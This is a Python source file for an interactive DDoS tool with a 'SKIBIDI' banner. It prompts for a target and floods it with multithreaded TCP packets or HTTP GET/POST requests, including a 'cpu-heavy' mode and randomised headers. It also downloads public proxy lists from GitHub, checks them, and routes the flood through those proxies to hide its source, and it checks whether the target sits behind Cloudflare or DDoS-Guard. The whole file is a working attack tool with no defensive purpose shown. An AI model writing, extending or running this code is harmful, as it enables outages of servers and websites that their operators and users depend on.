import os
import subprocess
import sys
import importlib
import socket
import threading
import time
from datetime import datetime
from colorama import init, Fore, Style
import requests
import socks
import urllib.request
import concurrent.futures
import random
import json

required_modules = ["requests", "colorama", "pysocks"]

def check_and_install_module(module_name):
    try:
        importlib.import_module(module_name)
        return True
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
        return True

missing = [m for m in required_modules if not check_and_install_module(m)]
if missing:
    print(f"[!] Missing modules: {', '.join(missing)}")
    sys.exit(1)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

init()

BANNER = f"""{Fore.RED}
███████╗██╗  ██╗██╗██████╗ ██╗██████╗ ██╗
██╔════╝██║ ██╔╝██║██╔══██╗██║██╔══██╗██║
███████╗█████╔╝ ██║██████╔╝██║██║  ██║██║
╚════██║██╔═██╗ ██║██╔══██╗██║██║  ██║██║
███████║██║  ██╗██║██████╔╝██║██████╔╝██║
╚══════╝╚═╝  ╚═╝╚═╝╚═════╝ ╚═╝╚═════╝ ╚═╝
{Style.RESET_ALL}
"""

# Global counters
success_count = 0
fail_count = 0
lock = threading.Lock()

def inc_success():
    global success_count
    with lock:
        success_count += 1

def inc_fail():
    global fail_count
    with lock:
        fail_count += 1

def get_server_ip(server_address):
    try:
        if ":" in server_address and not server_address.startswith("http"):
            host, port = server_address.rsplit(":", 1)
            port = int(port)
            ip_address = socket.gethostbyname(host)
            print(f"{Fore.GREEN}[+] EXTRACTED IP: {ip_address}, PORT: {port}{Style.RESET_ALL}")
            return ip_address, port
        else:
            res = requests.get(f"https://api.mcsrvstat.us/2/{server_address}", timeout=5).json()
            ip = res.get("ip") or socket.gethostbyname(server_address)
            port = int(res.get("port") or 25565)
            print(f"{Fore.GREEN}[+] EXTRACTED IP: {ip}, PORT: {port}{Style.RESET_ALL}")
            return ip, port
    except:
        return None, None

# --- Đã chỉnh sửa để lọc proxy HTTP hỗ trợ HTTPS ---
def is_proxy_working(proxy, proxy_type="socks5", test_host="1.1.1.1", test_port=53, timeout=3):
    ip, port = proxy.split(":")
    try:
        if proxy_type.startswith("socks"):
            s = socks.socksocket()
            if proxy_type == "socks5":
                s.set_proxy(socks.SOCKS5, ip, int(port))
            else:
                s.set_proxy(socks.SOCKS4, ip, int(port))
            s.settimeout(timeout)
            s.connect((test_host, test_port))
            s.close()
        else:
            # Kiểm tra cả HTTP và HTTPS
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            r1 = requests.get("http://example.com", proxies=proxies, timeout=timeout)
            r2 = requests.get("https://www.google.com", proxies=proxies, timeout=timeout)
            return (r1.status_code == 200 and r2.status_code == 200)
        return True
    except:
        return False
# ----------------------------------------------------

def send_packet(server_ip, server_port, packet, packet_count, thread_id, stop_event, proxy=None, proxy_type=None):
    try:
        s = socks.socksocket()
        if proxy and proxy_type and proxy_type.startswith("socks"):
            ip, port = proxy.split(":")
            if proxy_type == "socks5":
                s.set_proxy(socks.SOCKS5, ip, int(port))
            else:
                s.set_proxy(socks.SOCKS4, ip, int(port))
        s.settimeout(3)
        s.connect((server_ip, server_port))
        for i in range(packet_count):
            if stop_event.is_set():
                break
            try:
                s.sendall(packet)
                inc_success()
                now = datetime.now().strftime("%H:%M:%S")
                print(f"{Fore.CYAN}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | sᴇɴᴅ ᴘᴀᴄᴋᴇᴛ: ({i+1}/{packet_count}){Style.RESET_ALL}")
            except Exception as e:
                inc_fail()
                now = datetime.now().strftime("%H:%M:%S")
                print(f"{Fore.RED}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | ᴇʀʀᴏʀ: {e}{Style.RESET_ALL}")
    except Exception as e:
        inc_fail()
        now = datetime.now().strftime("%H:%M:%S")
        print(f"{Fore.RED}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | ᴇʀʀᴏʀ: {e}{Style.RESET_ALL}")

def random_headers():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "curl/8.0.1",
        "Wget/1.21.4",
        "PostmanRuntime/7.32.2"
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(["https://google.com", "https://bing.com"]),
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache"
    }

def send_http_flood(target_url, thread_id, stop_event, proxy=None, method="GET", cpu_heavy=False):
    proxies = None
    if proxy:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    large_payload = os.urandom(1024 * 100)
    while not stop_event.is_set():
        try:
            headers = random_headers()
            use_method = method
            if method == "BOTH":
                use_method = random.choice(["GET", "POST"])
            now = datetime.now().strftime("%H:%M:%S")
            print(f"{Fore.CYAN}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | HTTP {use_method} sᴇɴᴅɪɴɢ...{Style.RESET_ALL}")

            if cpu_heavy:
                if use_method == "POST":
                    data = {"data": large_payload.hex()}
                    r = requests.post(target_url, proxies=proxies, timeout=5, headers=headers, data=data)
                else:
                    r = requests.get(target_url + f"?load={random.randint(1,10**8)}", proxies=proxies, timeout=5, headers=headers)
            else:
                if use_method == "POST":
                    data = {"data": os.urandom(8).hex()}
                    r = requests.post(target_url, proxies=proxies, timeout=5, headers=headers, data=data)
                else:
                    r = requests.get(target_url, proxies=proxies, timeout=5, headers=headers)

            inc_success()
            now = datetime.now().strftime("%H:%M:%S")
            print(f"{Fore.GREEN}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | HTTP {use_method} -> {r.status_code}{Style.RESET_ALL}")
        except Exception as e:
            inc_fail()
            now = datetime.now().strftime("%H:%M:%S")
            print(f"{Fore.RED}[{now}] ᴛʜʀᴇᴀᴅ:{thread_id} | ᴇʀʀᴏʀ: {e}{Style.RESET_ALL}")

def stop_after_timeout(stop_event, timeout):
    time.sleep(timeout)
    stop_event.set()

def detect_protection(target):
    try:
        if target.startswith("http"):
            r = requests.get(target, timeout=5)
            headers = str(r.headers).lower()
            if "cloudflare" in headers:
                print(Fore.YELLOW + "[!] Website protected by Cloudflare" + Style.RESET_ALL)
            elif "ddos-guard" in headers:
                print(Fore.YELLOW + "[!] Website protected by DDoS-Guard" + Style.RESET_ALL)
    except:
        pass

def download_and_check_proxies():
    if os.path.exists("http_proxy.txt") and os.path.exists("socks4_5.txt"):
        print(f"{Fore.GREEN}[✓] Using cached proxy list.{Style.RESET_ALL}")
        return

    print(f"{Fore.YELLOW}[•] Downloading proxy lists...{Style.RESET_ALL}")
    urls = {
        "http": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "socks5": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "socks4": "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt"
    }

    urllib.request.urlretrieve(urls["http"], "http_all.txt")
    urllib.request.urlretrieve(urls["socks5"], "socks5_all.txt")
    urllib.request.urlretrieve(urls["socks4"], "socks4_all.txt")

    def check_list(file, ptype):
        with open(file) as f:
            lst = [x.strip() for x in f if x.strip()]
        good = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(lambda p: is_proxy_working(p, ptype), lst)
            for p, ok in zip(lst, results):
                if ok:
                    good.append(p)
        return good

    print("[•] Checking HTTP proxies...")
    good_http = check_list("http_all.txt", "http")
    print(f"[✓] Live: {len(good_http)}")

    print("[•] Checking SOCKS5 proxies...")
    good_socks5 = check_list("socks5_all.txt", "socks5")
    print(f"[✓] Live: {len(good_socks5)}")

    print("[•] Checking SOCKS4 proxies...")
    good_socks4 = check_list("socks4_all.txt", "socks4")
    print(f"[✓] Live: {len(good_socks4)}")

    with open("http_proxy.txt", "w") as f:
        for p in good_http:
            f.write(p + "\n")

    socks_all = list(set(good_socks4 + good_socks5))
    with open("socks4_5.txt", "w") as f:
        for p in socks_all:
            f.write(p + "\n")

    print(f"{Fore.GREEN}[✓] Proxy download and check complete!{Style.RESET_ALL}")

def run_ski():
    global success_count, fail_count
    success_count = 0
    fail_count = 0

    use_proxy = input(f"{Fore.YELLOW}[+] USE PROXY? (y/n): {Style.RESET_ALL}").strip().lower() == 'y'
    attack_mode = input(f"{Fore.YELLOW}[+] ATTACK MODE (tcp/http): {Style.RESET_ALL}").strip().lower()
    http_method = 'GET'
    cpu_heavy = False
    if attack_mode == 'http':
        http_method = input(f"{Fore.YELLOW}[+] HTTP METHOD (GET/POST/BOTH): {Style.RESET_ALL}").strip().upper()
        flood_mode = input(f"{Fore.YELLOW}[+] HTTP FLOOD MODE (normal/cpu-heavy): {Style.RESET_ALL}").strip().lower()
        cpu_heavy = (flood_mode == "cpu-heavy")
    clear_screen()
    print(BANNER)

    try:
        server_address = input(f"{Fore.YELLOW}[+]TARGET IP [IP/DOMAIN OR IP:PORT]: {Style.RESET_ALL}").strip()
        detect_protection(server_address)

        if attack_mode == "http":
            target_url = server_address
            server_ip, server_port = None, None
        else:
            server_ip, server_port = get_server_ip(server_address)
            if not server_ip:
                raise ValueError("Could not resolve server")

        timeout = int(input(f"{Fore.YELLOW}[+]ATTACK DURATION (SECONDS): {Style.RESET_ALL}"))
        print(f"{Fore.GREEN}[+] ATTACK DURATION (SECONDS): {timeout}{Style.RESET_ALL}")

        thread_count = int(input(f"{Fore.YELLOW}[+] THREAD COUNT: {Style.RESET_ALL}"))

        proxies = []
        if use_proxy:
            download_and_check_proxies()
            proxy_file = "http_proxy.txt" if attack_mode == "http" else "socks4_5.txt"
            with open(proxy_file, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(proxies)} proxies from {proxy_file}{Style.RESET_ALL}")

        packet = b"\x00" * (1024 * 1024)
        packet_count = 10000

        stop_event = threading.Event()
        threading.Thread(target=stop_after_timeout, args=(stop_event, timeout)).start()

        threads = []
        if attack_mode == "http":
            if not target_url.startswith("http"):
                target_url = "http://" + target_url
            for i in range(thread_count):
                proxy = proxies[i % len(proxies)] if proxies else None
                t = threading.Thread(target=send_http_flood, args=(target_url, i + 1, stop_event, proxy, http_method, cpu_heavy))
                threads.append(t)
                t.start()
        else:
            for i in range(thread_count):
                proxy = proxies[i % len(proxies)] if proxies else None
                t = threading.Thread(target=send_packet, args=(server_ip, server_port, packet, packet_count, i + 1, stop_event, proxy, "socks5"))
                threads.append(t)
                t.start()

        for t in threads:
            t.join()

        print(Fore.GREEN + "Attack done." + Style.RESET_ALL)
        print(Fore.CYAN + f"[+] Total success: {success_count}" + Style.RESET_ALL)
        print(Fore.RED + f"[+] Total fail: {fail_count}" + Style.RESET_ALL)

    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    run_ski()
